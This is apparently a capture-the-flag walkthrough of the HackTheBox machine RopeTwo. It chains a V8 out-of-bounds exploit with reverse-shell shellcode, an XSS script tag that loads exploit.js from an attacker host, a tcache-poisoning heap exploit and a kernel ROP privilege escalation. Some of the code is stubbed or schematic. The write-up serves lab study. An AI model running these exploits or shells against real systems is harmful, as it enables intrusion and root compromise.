# HackTheBox — RopeTwo

**Platform:** HackTheBox  
**Difficulty:** Insane  
**OS:** Linux  
**Category:** V8 JavaScript Engine Exploit / Heap Exploitation / Linux Kernel Module LPE  
**Status:** Retired  
**Author:** r4j0x00  

---

## Summary

RopeTwo is widely considered one of the hardest machines ever released on HackTheBox. It requires three distinct exploit development disciplines across three phases:

1. **Foothold** — Exploit a backdoored V8 JavaScript engine (Google's JS engine used in Chrome/Node.js) via an out-of-bounds array vulnerability. Combined with an XSS flaw in the web app, this achieves remote code execution.
2. **User** — Exploit a heap corruption bug in a SUID binary with strict interaction limits, requiring a custom tcache/unsorted-bin fake-chunk exploit chain.
3. **Root** — Exploit a vulnerable Linux Kernel Module (LKM) using kernel ROP to call `prepare_kernel_cred`/`commit_creds`, bypassing KASLR via a memory leak.

This is a pure binary exploitation box — there is no web login bypass, no default credentials, no sudo misconfiguration. Every step requires writing custom exploit code.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -p- --min-rate 5000 -oA nmap/ropetwo 10.10.10.196
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0p1
80/tcp   open  http    nginx 1.14.0
8000/tcp open  http    Node.js (Express)
```

Port 8000 runs a Node.js application. Port 80 is nginx.

---

## Phase 1 — V8 Out-of-Bounds + XSS → Foothold Shell

### Understanding the Setup

The web app on port 8000 accepts JavaScript code submissions. These are evaluated in a sandboxed environment using a **custom-patched V8 build** — the `d8` shell (V8's standalone JS interpreter).

The key is that the V8 build used on the server has a **deliberately introduced vulnerability** via a specific commit from `r4j0x00`.

### Analysing the Patch

Cloning the V8 source and diffing against the server's commit reveals two new functions added to `Array.prototype`:

```javascript
// Added builtins: GetLastElement and SetLastElement
Array.prototype.GetLastElement()  // returns element at array.length (OOB read)
Array.prototype.SetLastElement(v) // sets element at array.length (OOB write)
```

The bug: both functions use `array.length` as the index instead of `array.length - 1`. This is a classic **off-by-one out-of-bounds** access on a V8 JSArray.

### Helper Functions

```javascript
// Convert double float (V8 SMI/pointer representation) to BigInt hex
function d2hex(d) {
    let buf = new ArrayBuffer(8);
    let view = new DataView(buf);
    view.setFloat64(0, d, true);
    let lo = view.getUint32(0, true);
    let hi = view.getUint32(4, true);
    return BigInt(lo) + (BigInt(hi) << 32n);
}

// Convert BigInt to float for writing
function hex2d(h) {
    let buf = new ArrayBuffer(8);
    let view = new DataView(buf);
    view.setUint32(0, Number(h & 0xffffffffn), true);
    view.setUint32(4, Number(h >> 32n), true);
    return view.getFloat64(0, true);
}
```

### Addrof and Fakeobj Primitives

Using the OOB read/write on a carefully arranged set of objects, build the two fundamental V8 exploitation primitives:

**addrof** — leak the address of a JS object:

```javascript
function addrof(obj) {
    let arr = [1.1, 2.2, 3.3];    // float array (HOLEY_DOUBLE_ELEMENTS)
    let obj_arr = [obj];           // object array — elements pointer sits adjacent
    // OOB read from arr leaks pointer from obj_arr's backing store
    return d2hex(arr.GetLastElement());
}
```

**fakeobj** — create a JS object at an arbitrary address:

```javascript
function fakeobj(addr) {
    let arr = [1.1, 2.2, 3.3];
    arr.SetLastElement(hex2d(addr));  // OOB write into adjacent object pointer
    let obj_arr = [{}];
    return obj_arr[0];                // now points to our fake address
}
```

### Arbitrary Read/Write Primitives

With `addrof` and `fakeobj`, build full 64-bit arbitrary read/write by constructing a fake `JSArray` with a controlled `elements` pointer:

```javascript
let fake_arr_buf = [
    hex2d(0x0000000200000000n),  // map + properties
    hex2d(0n),                   // elements (will be overwritten)
    hex2d(0x0000000200000000n),  // length = 2
    1.1, 2.2                     // inline data
];

// ... position fake_arr_buf in memory and use fakeobj to create
// a JSArray whose elements pointer we control

function arb_read(addr) {
    fake_elements_ptr = addr - 8n;
    // set elements ptr of our fake array to target - 8
    // read [0] returns the qword at addr
}

function arb_write(addr, val) {
    fake_elements_ptr = addr - 8n;
    // set elements ptr, write [0] = val
}
```

### WASM for RWX Page

V8 compiles WebAssembly modules into RWX (read-write-execute) memory. Use this as a shellcode landing pad:

```javascript
// Instantiate a trivial WASM module to get an RWX page
let wasm_code = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,  // magic + version
    0x01, 0x04, 0x01, 0x60, 0x00, 0x00,               // type section
    0x03, 0x02, 0x01, 0x00,                           // function section
    0x07, 0x08, 0x01, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00, // export
    0x0a, 0x04, 0x01, 0x02, 0x00, 0x0b               // code section
]);
let wasm_mod = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_mod);
let wasm_func = wasm_instance.exports.main;

// Leak the address of the WasmInstance object
let wasm_addr = addrof(wasm_instance);

// Read the RWX page pointer from the WasmInstance struct (at known offset)
let rwx_page = arb_read(wasm_addr + 0x68n);  // offset varies by V8 version
```

### Writing Shellcode to RWX Page

```javascript
// x86-64 reverse shell shellcode
let shellcode = new Uint8Array([
    0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e,
    // ... full shellcode bytes for connect-back shell
    // generated via: msfvenom -p linux/x64/shell_reverse_tcp
    //                LHOST=10.10.14.X LPORT=4444 -f raw | xxd -i
]);

// Write shellcode into the RWX page byte-by-byte using arb_write
for (let i = 0; i < shellcode.length; i += 8) {
    let chunk = 0n;
    for (let j = 0; j < 8 && i+j < shellcode.length; j++) {
        chunk |= BigInt(shellcode[i+j]) << BigInt(j*8);
    }
    arb_write(rwx_page + BigInt(i), chunk);
}

// Trigger shellcode by calling the WASM function
wasm_func();
```

### Delivering via XSS

The web application on port 80 has an XSS vulnerability in a user-controlled field (e.g., a note, username, or comment). This is used to inject a `<script>` tag that causes the admin bot (running the vulnerable V8/d8 build) to load and execute the exploit JS:

```html
<script src="http://10.10.14.X/exploit.js"></script>
```

Start listener:

```bash
nc -lvnp 4444
```

Submit the XSS payload, wait for the admin bot to trigger it — **shell arrives as `www`**.

---

## User Flag — SUID Heap Exploit

### SUID Binary Discovery

```bash
find / -perm -u=s -type f 2>/dev/null
```

```
/usr/local/bin/writeup
```

### Binary Analysis

```bash
file /usr/local/bin/writeup
# ELF 64-bit LSB shared object, x86-64, dynamically linked

checksec --file=/usr/local/bin/writeup
```

```
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

Full mitigations — this is a pure heap exploitation challenge.

### Reverse Engineering

Load into Ghidra or radare2. The binary:
- Runs as root SUID, but drops to `r4j` user on normal exit
- Allocates heap chunks via a custom allocator interface
- Allows a **very limited** set of heap operations (controlled `malloc`, `free`, `read`)
- Has an integer overflow or use-after-free in chunk management

The restriction: you can only interact with the heap through specific menu options that limit chunk sizes and operation counts — forcing a carefully constrained exploit.

### Exploitation Strategy — tcache Poison / Unsorted Bin Attack

With the limited interaction model:

1. **Leak a heap address** — trigger an allocation sequence that leaves a pointer readable via an info disclosure in the print functionality
2. **Leak libc base** — create an unsorted bin chunk (size > 0x80) and read its `fd`/`bk` pointers (which point into `main_arena` in libc)
3. **tcache poisoning** — overwrite the `fd` pointer of a freed tcache chunk to point to `__free_hook` (or `__malloc_hook`)
4. **Write shellcode address / one_gadget** — allocate from the poisoned tcache to get a chunk at `__free_hook`, write a `one_gadget` RCE gadget
5. **Trigger** — free any chunk to call `__free_hook` → one_gadget → shell as `r4j`

```python
from pwn import *

elf = ELF('/usr/local/bin/writeup')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = remote('localhost', ...)  # or process

def alloc(size, data):   ...
def free(idx):           ...
def show(idx):           ...

# Step 1: get heap leak
# Step 2: get libc leak via unsorted bin fd/bk
# Step 3: tcache poison → __free_hook
# Step 4: write one_gadget
libc_base = leaked_addr - libc.symbols['main_arena'] - 96
one_gadget = libc_base + 0x10a2fc   # verify with one_gadget tool

# Overwrite __free_hook with one_gadget
alloc(0x30, p64(libc.symbols['__free_hook'] + libc_base))
alloc(0x30, b'AAAA')                 # tcache alloc 1
alloc(0x30, p64(one_gadget))         # tcache alloc 2 → lands at __free_hook

# Trigger
free(any_index)

p.interactive()
```

Shell as **r4j**.

### User Flag

```bash
cat /home/r4j/user.txt
```

---

## Root — Kernel Module Exploitation

### Enumeration

```bash
lsmod
```

```
ropetwo_mod   (custom kernel module loaded)
```

```bash
ls -la /dev/ropetwo
# crw-rw-rw- 1 root root ... /dev/ropetwo   ← world-readable/writable char device
```

The module exposes a character device. Anyone can read/write to it.

### Module Analysis

Extract the kernel module:

```bash
modinfo ropetwo_mod
find /lib/modules -name "*.ko" | xargs ls -la
```

Reverse engineer the `.ko` file with Ghidra or IDA. The module implements a `/dev/ropetwo` character device with `ioctl` and `write` handlers.

The vulnerability: the `write` handler copies user-supplied data into a **fixed-size kernel stack buffer without bounds checking** — a **kernel stack buffer overflow**.

```c
// Vulnerable handler (simplified from decompilation)
static ssize_t ropetwo_write(struct file *f, const char __user *buf, size_t count, loff_t *off) {
    char kbuf[0x40];                          // fixed 64-byte kernel stack buffer
    copy_from_user(kbuf, buf, count);         // count is unchecked!
    // ...
}
```

### Exploit Strategy — Kernel ROP Chain

Kernel exploitation with KASLR requires:

1. **Leak KASLR base** — use the read path of the device or `/proc` to leak a kernel pointer that reveals the slide
2. **Build a ROP chain** that calls:
   - `prepare_kernel_cred(0)` → creates root credentials
   - `commit_creds(result)` → applies them to the current process
   - Returns cleanly via `swapgs_restore_regs_and_return_to_usermode` (or `iretq` with careful stack setup)
3. **Overflow** the kernel stack buffer to hijack `RIP`

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <sys/ioctl.h>

// Gadget offsets from vmlinux (relative to kernel base after KASLR leak)
#define POP_RDI        0x...   // pop rdi; ret
#define POP_RCX        0x...   // pop rcx; ret
#define MOV_RDI_RAX    0x...   // mov rdi, rax; ret (for commit_creds arg)
#define SWAPGS_RETURN  0x...   // swapgs_restore_regs_and_return_to_usermode

typedef uint64_t u64;

u64 kernel_base = 0;

// Step 1: leak kernel base
void leak_kaslr() {
    // Read from /dev/ropetwo or parse /proc/kallsyms (if readable)
    // or use the module's info disclosure gadget
    // kernel_base = leaked_addr - known_symbol_offset;
}

void escalate() {
    // build ROP payload on local buffer
    u64 rop[50];
    int i = 0;

    // padding to reach RIP (determined via crash analysis)
    for (int j = 0; j < PADDING/8; j++) rop[i++] = 0x4141414141414141ULL;

    rop[i++] = kernel_base + POP_RDI;
    rop[i++] = 0;                               // prepare_kernel_cred(0)
    rop[i++] = kernel_base + prepare_kernel_cred_off;
    rop[i++] = kernel_base + MOV_RDI_RAX;       // move result to rdi
    rop[i++] = kernel_base + commit_creds_off;  // commit_creds(new_cred)

    // return to userland
    rop[i++] = kernel_base + SWAPGS_RETURN;
    rop[i++] = 0;                               // padding
    rop[i++] = (u64)win_func;                   // user RIP
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_rsp;
    rop[i++] = user_ss;

    int fd = open("/dev/ropetwo", O_RDWR);
    write(fd, rop, sizeof(rop));
    close(fd);
}

void win_func() {
    // Now running as root in userspace
    if (getuid() == 0) {
        system("/bin/bash");
    }
}

int main() {
    // Save user-space segment registers for clean return
    __asm__ volatile(
        "mov %0, cs;"
        "pushfq; pop %1;"
        "mov %2, rsp;"
        "mov %3, ss;"
        : "=r"(user_cs), "=r"(user_rflags), "=r"(user_rsp), "=r"(user_ss)
    );

    leak_kaslr();
    escalate();
    return 0;
}
```

Compile and run:

```bash
gcc exploit.c -o exploit -static -no-pie
./exploit
```

**Root shell obtained.**

---

## Root Flag

```bash
cat /root/root.txt
```

---

## Key Takeaways

- **V8 exploitation** starts with identifying the OOB primitive, building `addrof`/`fakeobj`, then chaining to arb-read/write via a fake JSArray
- WASM JIT compilation creates an RWX page — the standard landing pad for V8 shellcode injection
- **Pointer Compression** in newer V8 builds changes address representation to 32-bit — the upper 32 bits (isolate root) must be factored into all pointer arithmetic
- SUID heap exploits with restricted interaction require careful primitive construction: unsorted-bin for libc leak, tcache poison for hook overwrite
- Kernel exploitation workflow: leak KASLR → find gadgets in `vmlinux` → ROP to `prepare_kernel_cred(0)` + `commit_creds` → clean `iretq`/`swapgs` return to userspace
- Building and debugging a kernel exploit locally requires a QEMU environment matching the target kernel — always set up before attempting remote

---

## Attack Chain

```
XSS in web app → admin bot loads exploit.js
        ↓
V8 OOB (GetLastElement/SetLastElement) → addrof + fakeobj
        ↓
Arbitrary R/W → WASM RWX page → shellcode injection
        ↓
Shell as www
        ↓
SUID binary heap exploit (tcache poison → __free_hook)
        ↓
Shell as r4j  →  user.txt
        ↓
Kernel module stack overflow → ROP chain
        →  prepare_kernel_cred(0) + commit_creds
        ↓
Root shell  →  root.txt
```

---

## Resources

- 0xdf writeup: https://0xdf.gitlab.io/2021/01/16/htb-ropetwo.html
- PwnFuzz writeup: https://old.pwnfuzz.com/posts/ropetwo-hackthebox/
- Faith's oob-v8 roadmap (referenced in community writeups)
- V8 exploitation primer: https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| V8 / d8 source | Patch analysis (GetLastElement/SetLastElement bug) |
| JavaScript | V8 exploit (OOB → addrof/fakeobj → arb RW → shellcode) |
| pwntools | SUID heap exploit scripting |
| Ghidra / radare2 | SUID binary and kernel module RE |
| GDB + pwndbg/GEF | Heap debugging |
| QEMU | Local kernel exploit development environment |
| ROPgadget / ropper | Kernel ROP gadget finding |
| one_gadget | libc RCE gadget finder |
| vmlinux-to-elf | Extract symbol table from kernel image |
